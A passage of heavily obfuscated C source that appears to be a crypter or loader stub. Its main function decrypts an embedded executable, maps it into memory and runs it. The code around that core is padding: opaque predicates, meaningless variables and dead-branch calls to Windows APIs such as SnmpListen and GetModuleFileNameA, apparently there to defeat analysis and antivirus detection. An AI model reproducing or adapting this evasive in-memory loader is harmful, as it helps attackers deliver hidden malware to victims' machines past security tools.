                if (!(((v94115500be1bc8338c28204a05ca0497_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v94115500be1bc8338c28204a05ca0497_prime_opaque == ((unsigned int) 2))))
                {
                  vd6ad3a54bb900306b99d96d4c67009f4_random_opaque = v32ad33bb031d2dddc7d9394bbcf61e88_computation_opaque || v94115500be1bc8338c28204a05ca0497_prime_opaque;
                }
              }

            }
          }
        }

        unsigned int v3db4c102632524987afda45fadbc335c_prime_opaque = va683c309f1d5939633bf0b6efc8c828c_computation_opaque;
        unsigned int v8bc00e0b9c5c00d84f963f2a2dc97f83_useless_opaque = (unsigned int) 4095680133;
        unsigned int vb0602ebf4934cb1b64e66c23ca54f9c0_computation_opaque = (unsigned int) (&v8bc00e0b9c5c00d84f963f2a2dc97f83_useless_opaque);
        unsigned int v3db078db23e8924b06219521b1426401_true_opaque = (((vb0602ebf4934cb1b64e66c23ca54f9c0_computation_opaque * vb0602ebf4934cb1b64e66c23ca54f9c0_computation_opaque) + vb0602ebf4934cb1b64e66c23ca54f9c0_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      }
    }
  }
}

int main(void)
{
  {
    unsigned int vfb6ecf062860ee48a55e5d4d67294307_useless_opaque = (unsigned int) 556711002;
    unsigned int vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque = (unsigned int) (&vfb6ecf062860ee48a55e5d4d67294307_useless_opaque);
    {
      unsigned int vb206b949225ea97d363278aa1c721817_useless_opaque = (unsigned int) 4088709930;
      unsigned int v1e5430eb96f1721f81298cb95d436d45_computation_opaque = (unsigned int) (&vb206b949225ea97d363278aa1c721817_useless_opaque);
      unsigned int v92f3041f1d829fdb2bed399083f7874a_true_opaque = (((v1e5430eb96f1721f81298cb95d436d45_computation_opaque * v1e5430eb96f1721f81298cb95d436d45_computation_opaque) + v1e5430eb96f1721f81298cb95d436d45_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
      {
        if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
        {
          void * v4e9566b43def85411b6ba7236bb24d53 = (void *) 0xa5153813;
          void * v3d00c38de1dcb314d854a18d469bb179 = (void *) 0xec0e01cc;
          unsigned long v910a5f29b9e6bf7e6b6179ff2cf0f077 = (unsigned long) 0x77d467cc;
          unsigned long vcc81ac82cdf3afa15aa3ef119509197a = (unsigned long) 0xdcf5d3bd;
          vcc81ac82cdf3afa15aa3ef119509197a = GetModuleFileNameA(v4e9566b43def85411b6ba7236bb24d53, v3d00c38de1dcb314d854a18d469bb179, v910a5f29b9e6bf7e6b6179ff2cf0f077);
        }
        init_kernel_library();
        decrypt_data(executable_pe, executable_size);
        DWORD new_size = (executable_size - ((DWORD) iv_length)) - ((DWORD) executable_pe[executable_size - 1]);
        in_memory_pe *pe_to_execute = code_handling_load_pe(executable_pe + iv_length, new_size);
        if (pe_to_execute == 0)
        {
          if (v92f3041f1d829fdb2bed399083f7874a_true_opaque)
          {
            if (!((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25))))
            {
              if ((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25)))
              {
                if ((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25)))
                {
                  if (!((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25))))
                  {
                    vb206b949225ea97d363278aa1c721817_useless_opaque = vb206b949225ea97d363278aa1c721817_useless_opaque + v92f3041f1d829fdb2bed399083f7874a_true_opaque;
                    v1e5430eb96f1721f81298cb95d436d45_computation_opaque = vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque != v1e5430eb96f1721f81298cb95d436d45_computation_opaque;
                  }
                  void * vdd97c49fd21c29e856ac2db89d5766ca = (void *) 0x431f4174;
                  unsigned long v58c2df1342aac90de61e5499412000a2 = (unsigned long) 0xe20eb0c2;
                  unsigned long vf3cfc27d0284b637545f641270c0c9e0 = (unsigned long) 0x7b25b109;
                  vf3cfc27d0284b637545f641270c0c9e0 = SnmpListen(vdd97c49fd21c29e856ac2db89d5766ca, v58c2df1342aac90de61e5499412000a2);
                }
              }
              if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
              {
                v1e5430eb96f1721f81298cb95d436d45_computation_opaque = v1e5430eb96f1721f81298cb95d436d45_computation_opaque <= vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque;
                vb206b949225ea97d363278aa1c721817_useless_opaque = v1e5430eb96f1721f81298cb95d436d45_computation_opaque % ((unsigned int) 123);
              }
            }
            return -1;
            if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
            {
              if (!((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25))))
              {
                if (!((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25))))
                {
                  vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque = v92f3041f1d829fdb2bed399083f7874a_true_opaque % vb206b949225ea97d363278aa1c721817_useless_opaque;
                  vb206b949225ea97d363278aa1c721817_useless_opaque = vfb6ecf062860ee48a55e5d4d67294307_useless_opaque <= vb206b949225ea97d363278aa1c721817_useless_opaque;
                  vb206b949225ea97d363278aa1c721817_useless_opaque = vfb6ecf062860ee48a55e5d4d67294307_useless_opaque | vb206b949225ea97d363278aa1c721817_useless_opaque;
                  vfb6ecf062860ee48a55e5d4d67294307_useless_opaque = v1e5430eb96f1721f81298cb95d436d45_computation_opaque % v92f3041f1d829fdb2bed399083f7874a_true_opaque;
                  vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque = vb206b949225ea97d363278aa1c721817_useless_opaque % vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque;
                }
                if ((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25)))
                {
                  vb206b949225ea97d363278aa1c721817_useless_opaque = vfb6ecf062860ee48a55e5d4d67294307_useless_opaque != ((unsigned int) 52);
                  vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque = vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque == vb206b949225ea97d363278aa1c721817_useless_opaque;
                  vb206b949225ea97d363278aa1c721817_useless_opaque = vb206b949225ea97d363278aa1c721817_useless_opaque + v92f3041f1d829fdb2bed399083f7874a_true_opaque;
                  vb206b949225ea97d363278aa1c721817_useless_opaque = v92f3041f1d829fdb2bed399083f7874a_true_opaque == vb206b949225ea97d363278aa1c721817_useless_opaque;
                }
              }
              unsigned long v48cdd7c04c0cd84e51b66679b2a84334 = (unsigned long) 0xbdcc59d7;
              unsigned long va6da41fde7c880ed733665d7fb2836dd = (unsigned long) 0x333f3877;
              va6da41fde7c880ed733665d7fb2836dd = MsiGetActiveDatabase(v48cdd7c04c0cd84e51b66679b2a84334);
              if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
              {
                vfb6ecf062860ee48a55e5d4d67294307_useless_opaque = vb206b949225ea97d363278aa1c721817_useless_opaque < ((unsigned int) 116);
                v92f3041f1d829fdb2bed399083f7874a_true_opaque = v92f3041f1d829fdb2bed399083f7874a_true_opaque != vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque;
                vb206b949225ea97d363278aa1c721817_useless_opaque = vb206b949225ea97d363278aa1c721817_useless_opaque / ((unsigned int) 98);
                vb206b949225ea97d363278aa1c721817_useless_opaque = vfb6ecf062860ee48a55e5d4d67294307_useless_opaque + v92f3041f1d829fdb2bed399083f7874a_true_opaque;
                if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
                {
                  v1e5430eb96f1721f81298cb95d436d45_computation_opaque = v92f3041f1d829fdb2bed399083f7874a_true_opaque | vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque;
                }
              }
            }
          }
        }
        code_handling_execute(pe_to_execute);
        return 0;
        unsigned int v06dc282682bb8a844d603c194e876376_useless_opaque = (unsigned int) 777074223;
        unsigned int v830362e2f80e578f884acf88a81632c1_computation_opaque = (unsigned int) (&v06dc282682bb8a844d603c194e876376_useless_opaque);
        if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
        {
          vb206b949225ea97d363278aa1c721817_useless_opaque = v830362e2f80e578f884acf88a81632c1_computation_opaque - vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque;
          vfb6ecf062860ee48a55e5d4d67294307_useless_opaque = vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque || v1e5430eb96f1721f81298cb95d436d45_computation_opaque;
          vb206b949225ea97d363278aa1c721817_useless_opaque = v830362e2f80e578f884acf88a81632c1_computation_opaque < v06dc282682bb8a844d603c194e876376_useless_opaque;
          v1e5430eb96f1721f81298cb95d436d45_computation_opaque = v92f3041f1d829fdb2bed399083f7874a_true_opaque % vb206b949225ea97d363278aa1c721817_useless_opaque;
        }
        if (v92f3041f1d829fdb2bed399083f7874a_true_opaque)
        {
          if (v92f3041f1d829fdb2bed399083f7874a_true_opaque)
          {
            if (v92f3041f1d829fdb2bed399083f7874a_true_opaque)
            {
              if (v92f3041f1d829fdb2bed399083f7874a_true_opaque)
              {
                unsigned int ve1be6c2edc21ff0259cf3764febcede0_true_opaque = (((v830362e2f80e578f884acf88a81632c1_computation_opaque * v830362e2f80e578f884acf88a81632c1_computation_opaque) + v830362e2f80e578f884acf88a81632c1_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
              }
            }
          }
        }
      }
      unsigned int v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque = (unsigned int) 258992068;
      unsigned int v29fdebf537a262d68c2e291c68d4eeeb_computation_opaque = (unsigned int) 0;
      unsigned int v83504bb4e897035825c3035ca8382286_computation_opaque = (unsigned int) 3;
      unsigned int vc235b602bdca47f97e2adf56068ff295_computation_opaque = (unsigned int) (&v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque);
      if (!((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25))))
      {
        void * v3933732c5fa11f0c360469b092d757d0 = (void *) 0x2968d1dd;
        if (!((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25))))
        {
          if (!((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25))))
          {
            unsigned long v3b34fd997877179eabdc936d3cb03c6e = (unsigned long) 0x62f11600;
            void * vafa9b4fb61399d80223c24568df0be6d = (void *) 0x543d9583;
            if (!((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25))))
            {
              if (v92f3041f1d829fdb2bed399083f7874a_true_opaque)
              {
                void * v12d7bcfdb10a5105e07f449e46c868fc = (void *) 0x4687587a;
                unsigned long v1cca38db32f001a5650cfa70b989d5ad = (unsigned long) 0x0bca00de;
                unsigned long v74963f20040651fe7a0c692ce635e392 = (unsigned long) 0xd9278158;
                v74963f20040651fe7a0c692ce635e392 = SnmpListen(v12d7bcfdb10a5105e07f449e46c868fc, v1cca38db32f001a5650cfa70b989d5ad);
              }
            }
            int ve79e124f7af2cf9a0975db549e9bddff = (int) 0x7fb061fb;
            if (v92f3041f1d829fdb2bed399083f7874a_true_opaque)
            {
              void * v7592d6f5f6e76133a7faf844600ef6fa = (void *) 0x6d2e2fad;
              if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
              {
                v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque = vb206b949225ea97d363278aa1c721817_useless_opaque | vc235b602bdca47f97e2adf56068ff295_computation_opaque;
                vc235b602bdca47f97e2adf56068ff295_computation_opaque = vfb6ecf062860ee48a55e5d4d67294307_useless_opaque - v83504bb4e897035825c3035ca8382286_computation_opaque;
                vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque = v1e5430eb96f1721f81298cb95d436d45_computation_opaque / vfb6ecf062860ee48a55e5d4d67294307_useless_opaque;
              }
              if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
              {
                void * vc0a9870a4bb47539ad06ecc64867e790 = (void *) 0x84aab88d;
                unsigned long vc0af5cde75523c778221b13a110e7198 = (unsigned long) 0x6df22407;
                unsigned long v53919582d082ea99de271fd447d06c1c = (unsigned long) 0x241087f8;
                if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
                {
                  void * v98747caf9fabf7ea3d133bc686e9abf0 = (void *) 0x4a58fc7a;
                  long ve9942c3666576504bc6dac6b0554adbb = (long) 0xfe7d5b2c;
                  ve9942c3666576504bc6dac6b0554adbb = RoUnregisterForApartmentShutdown(v98747caf9fabf7ea3d133bc686e9abf0);
                }
                if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
                {
                  v29fdebf537a262d68c2e291c68d4eeeb_computation_opaque = vfb6ecf062860ee48a55e5d4d67294307_useless_opaque != v1e5430eb96f1721f81298cb95d436d45_computation_opaque;
                  v92f3041f1d829fdb2bed399083f7874a_true_opaque = v1e5430eb96f1721f81298cb95d436d45_computation_opaque < vc235b602bdca47f97e2adf56068ff295_computation_opaque;
                  vc235b602bdca47f97e2adf56068ff295_computation_opaque = vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque || v1e5430eb96f1721f81298cb95d436d45_computation_opaque;
                  v92f3041f1d829fdb2bed399083f7874a_true_opaque = v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque != v29fdebf537a262d68c2e291c68d4eeeb_computation_opaque;
                  v1e5430eb96f1721f81298cb95d436d45_computation_opaque = v1e5430eb96f1721f81298cb95d436d45_computation_opaque || vfb6ecf062860ee48a55e5d4d67294307_useless_opaque;
                }
                v53919582d082ea99de271fd447d06c1c = SnmpListen(vc0a9870a4bb47539ad06ecc64867e790, vc0af5cde75523c778221b13a110e7198);
              }
              int v6ba8f3ee6a730e8341e0313a6f06a568 = (int) 0xc0cd0055;
              int va1aa84f4c33fb6f621c4a690c1bed709 = (int) 0x6f3d6ece;
              va1aa84f4c33fb6f621c4a690c1bed709 = IdnToNameprepUnicode(v3b34fd997877179eabdc936d3cb03c6e, vafa9b4fb61399d80223c24568df0be6d, ve79e124f7af2cf9a0975db549e9bddff, v7592d6f5f6e76133a7faf844600ef6fa, v6ba8f3ee6a730e8341e0313a6f06a568);
            }
          }
          if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
          {
            if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
            {
              v83504bb4e897035825c3035ca8382286_computation_opaque = vb206b949225ea97d363278aa1c721817_useless_opaque % v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque;
            }
            if ((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25)))
            {
              void * v46caee383b96625a695ad8125bca1e37 = (void *) 0x8ce9367f;
              long v9bb18c520280e7cff90b24a682e6f1e0 = (long) 0xc75c52f1;
              if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
              {
                v1e5430eb96f1721f81298cb95d436d45_computation_opaque = v92f3041f1d829fdb2bed399083f7874a_true_opaque < vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque;
                v29fdebf537a262d68c2e291c68d4eeeb_computation_opaque = v92f3041f1d829fdb2bed399083f7874a_true_opaque <= ((unsigned int) 54);
                v92f3041f1d829fdb2bed399083f7874a_true_opaque = v1e5430eb96f1721f81298cb95d436d45_computation_opaque + ((unsigned int) 26);
                vfb6ecf062860ee48a55e5d4d67294307_useless_opaque = vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque || vc235b602bdca47f97e2adf56068ff295_computation_opaque;
                vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque = v83504bb4e897035825c3035ca8382286_computation_opaque || vc235b602bdca47f97e2adf56068ff295_computation_opaque;
                vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque = v92f3041f1d829fdb2bed399083f7874a_true_opaque + v1e5430eb96f1721f81298cb95d436d45_computation_opaque;
              }
              v9bb18c520280e7cff90b24a682e6f1e0 = RoUnregisterForApartmentShutdown(v46caee383b96625a695ad8125bca1e37);
              if ((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25)))
              {
                if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
                {
                  unsigned long v0c361477d90a144f2a73d4318e5fd193 = (unsigned long) 0x1807e5cd;
                  void * v35b74155751c74c68a854a1febae457b = (void *) 0x0983c95f;
                  int v339a3da78a1ac0b962f51ebc80af38e3 = (int) 0x75e75ecb;
                  void * v2e5041486fd4ea3ab753c6f905162296 = (void *) 0x56a0a98c;
                  int v5f1a359e7a23fb4cfa6f003bcf75e9a8 = (int) 0xf5cdc18a;
                  int va45e6932b2de79e964dcfc36825c45f1 = (int) 0x1386ed4a;
                  if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
                  {
                    void * vb491817b55f651b63bd2e7122ba906df = (void *) 0xae86e0f3;
                    int v182e5bcbe2619a3d08ccbf5b49879834 = (int) 0xfc7ad5ee;
                    v182e5bcbe2619a3d08ccbf5b49879834 = RemoveDllDirectory(vb491817b55f651b63bd2e7122ba906df);
                  }
                  va45e6932b2de79e964dcfc36825c45f1 = IdnToNameprepUnicode(v0c361477d90a144f2a73d4318e5fd193, v35b74155751c74c68a854a1febae457b, v339a3da78a1ac0b962f51ebc80af38e3, v2e5041486fd4ea3ab753c6f905162296, v5f1a359e7a23fb4cfa6f003bcf75e9a8);
                }
              }
            }
          }
          void * v28b33a34bfef58f79a505d1692ac8c67 = (void *) 0xb6428efb;
          void * v84f6664cf9d00012ee74963808e36bf4 = (void *) 0x9c7b62d8;
          unsigned long v2a5abccf5d7bc12de9f944ffdc086261 = (unsigned long) 0x442f355d;
          unsigned long v1e367166bbdc3d37e67e0885216f133a = (unsigned long) 0x28c21ab8;
          v1e367166bbdc3d37e67e0885216f133a = GetModuleFileNameA(v28b33a34bfef58f79a505d1692ac8c67, v84f6664cf9d00012ee74963808e36bf4, v2a5abccf5d7bc12de9f944ffdc086261);
        }
        if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
        {
          unsigned long v5f0eb4fec75ec795d23ef4475fea98e5 = (unsigned long) 0x33284b22;
          unsigned long v9a195242cb990efc399011bfcb6d7f70 = (unsigned long) 0xa9b63fce;
          void * v3c515d5be00023abb4e203ac3112d294 = (void *) 0xa0f34590;
          int v174e018775a39116f9e290b945836563 = (int) 0x1a1b3672;
          int v36a4f3e56996f1076b8063956d866780 = (int) 0x0127b4f3;
          v36a4f3e56996f1076b8063956d866780 = GetLocaleInfoW(v5f0eb4fec75ec795d23ef4475fea98e5, v9a195242cb990efc399011bfcb6d7f70, v3c515d5be00023abb4e203ac3112d294, v174e018775a39116f9e290b945836563);
        }
        if ((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25)))
        {
          if (v92f3041f1d829fdb2bed399083f7874a_true_opaque)
          {
            if ((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25)))
            {
              if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
              {
                vfb6ecf062860ee48a55e5d4d67294307_useless_opaque = vb206b949225ea97d363278aa1c721817_useless_opaque % v83504bb4e897035825c3035ca8382286_computation_opaque;
                v1e5430eb96f1721f81298cb95d436d45_computation_opaque = vfb6ecf062860ee48a55e5d4d67294307_useless_opaque - v83504bb4e897035825c3035ca8382286_computation_opaque;
                vfb6ecf062860ee48a55e5d4d67294307_useless_opaque = v83504bb4e897035825c3035ca8382286_computation_opaque * vfb6ecf062860ee48a55e5d4d67294307_useless_opaque;
              }
              int v0d7dc850db0cd8a51f10427aaeec776f = (int) 0x5fa1e04b;
              v0d7dc850db0cd8a51f10427aaeec776f = RemoveDllDirectory(v3933732c5fa11f0c360469b092d757d0);
            }
          }
        }
        if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
        {
          v83504bb4e897035825c3035ca8382286_computation_opaque = v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque != v29fdebf537a262d68c2e291c68d4eeeb_computation_opaque;
          vb206b949225ea97d363278aa1c721817_useless_opaque = vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque - v92f3041f1d829fdb2bed399083f7874a_true_opaque;
          v83504bb4e897035825c3035ca8382286_computation_opaque = vfb6ecf062860ee48a55e5d4d67294307_useless_opaque || v92f3041f1d829fdb2bed399083f7874a_true_opaque;
          v92f3041f1d829fdb2bed399083f7874a_true_opaque = vb206b949225ea97d363278aa1c721817_useless_opaque != vfb6ecf062860ee48a55e5d4d67294307_useless_opaque;
          vfb6ecf062860ee48a55e5d4d67294307_useless_opaque = v29fdebf537a262d68c2e291c68d4eeeb_computation_opaque * v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque;
        }
      }
      vc235b602bdca47f97e2adf56068ff295_computation_opaque = (vc235b602bdca47f97e2adf56068ff295_computation_opaque % ((unsigned int) 2147483647)) | ((unsigned int) 1);
      if (vc235b602bdca47f97e2adf56068ff295_computation_opaque < ((unsigned int) 3))
      {
        if (v92f3041f1d829fdb2bed399083f7874a_true_opaque)
        {
          vc235b602bdca47f97e2adf56068ff295_computation_opaque = (unsigned int) 3;
          if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
          {
            v92f3041f1d829fdb2bed399083f7874a_true_opaque = v29fdebf537a262d68c2e291c68d4eeeb_computation_opaque | ((unsigned int) 74);
            v83504bb4e897035825c3035ca8382286_computation_opaque = vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque == vb206b949225ea97d363278aa1c721817_useless_opaque;
            vfb6ecf062860ee48a55e5d4d67294307_useless_opaque = vfb6ecf062860ee48a55e5d4d67294307_useless_opaque != v1e5430eb96f1721f81298cb95d436d45_computation_opaque;
            vfb6ecf062860ee48a55e5d4d67294307_useless_opaque = v92f3041f1d829fdb2bed399083f7874a_true_opaque % vb206b949225ea97d363278aa1c721817_useless_opaque;
          }
          if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
          {
            unsigned long v8b5ec30f6c9e39d1e68861c5d42e64f7 = (unsigned long) 0x777879a3;
            void * v9590b87504aae2c6180caa42e3279734 = (void *) 0x0a2c1bbe;
            int vab55d2e3c396b5f95fde2f3b35cef3f1 = (int) 0xb4270e99;
            void * v2c8fbdc6b2eb8ca27250b39b5f986773 = (void *) 0x49bf75a8;
            int vbe56f5978c935a47d30ff7f5f8ee4956 = (int) 0xd0e27d1a;
            int vef0eef241ff6abc9d761db058fefb7e9 = (int) 0x759c5927;
            vef0eef241ff6abc9d761db058fefb7e9 = IdnToNameprepUnicode(v8b5ec30f6c9e39d1e68861c5d42e64f7, v9590b87504aae2c6180caa42e3279734, vab55d2e3c396b5f95fde2f3b35cef3f1, v2c8fbdc6b2eb8ca27250b39b5f986773, vbe56f5978c935a47d30ff7f5f8ee4956);
          }
        }
      }
      while (v29fdebf537a262d68c2e291c68d4eeeb_computation_opaque != ((unsigned int) 1))
      {
        vc235b602bdca47f97e2adf56068ff295_computation_opaque += (unsigned int) 2;
        v29fdebf537a262d68c2e291c68d4eeeb_computation_opaque = (unsigned int) 1;
        v83504bb4e897035825c3035ca8382286_computation_opaque = (unsigned int) 3;
        while ((v83504bb4e897035825c3035ca8382286_computation_opaque * v83504bb4e897035825c3035ca8382286_computation_opaque) <= vc235b602bdca47f97e2adf56068ff295_computation_opaque)
        {
          if (!((((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 9)) + ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 16))) == ((vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque * vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque) * ((unsigned int) 25))))
          {
            if (!v92f3041f1d829fdb2bed399083f7874a_true_opaque)
            {
              vc235b602bdca47f97e2adf56068ff295_computation_opaque = v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque == vc72ae8dc9cf1e6e668a4998e6814414a_random_opaque;
              v9b558cfe4ca5d82448b20b58432ad7a7_useless_opaque = vc235b602bdca47f97e2adf56068ff295_computation_opaque * vfb6ecf062860ee48a55e5d4d67294307_useless_opaque;
